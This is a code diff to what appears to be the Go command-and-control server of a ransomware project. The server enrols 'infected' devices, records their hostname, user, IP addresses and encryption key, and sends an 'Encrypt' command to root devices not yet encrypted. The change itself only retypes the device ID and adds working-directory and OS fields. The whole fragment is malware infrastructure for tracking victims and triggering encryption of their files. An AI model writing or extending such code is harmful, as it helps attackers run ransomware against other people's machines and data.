@@ -15,10 +15,12 @@ var (
 )
 
 type Enumeration struct {
-	ID        int      `json:"ID"`
+	ID        string   `json:"ID"`
 	Hostname  string   `json:"Hostname"`
 	User      string   `json:"User"`
 	IP        []string `json:"IP"`
+	Pwd       string   `json:"Pwd"`
+	OS        string   `json:"OS"`
 	Encrypted bool
 	Key       string
 }
@@ -40,7 +42,7 @@ func InfectedHandler(w http.ResponseWriter, r *http.Request) {
 		log.Fatalf("Issue getting enumeration data from device: %s", err)
 	}
 	json.Unmarshal([]byte(req), &device)
-	log.Printf("Enrolled a new device: %d", device.ID)
+	log.Printf("Enrolled a new device: %s", device.ID)
 	device.Encrypted = false
 	devices = append(devices, device)
 
@@ -59,7 +61,7 @@ func CommandHandler(w http.ResponseWriter, r *http.Request) {
 	//Reads the header of the request and issue commands
 	//Tied to Agent.KeepAlive()
 
-	fmt.Printf("Device %d requesting commands \n", device.ID)
+	fmt.Printf("Device %s requesting commands \n", device.ID)
 	if device.User == "Root" && !device.Encrypted {
 		w.WriteHeader(http.StatusOK)
 		command := []byte("Encrypt")
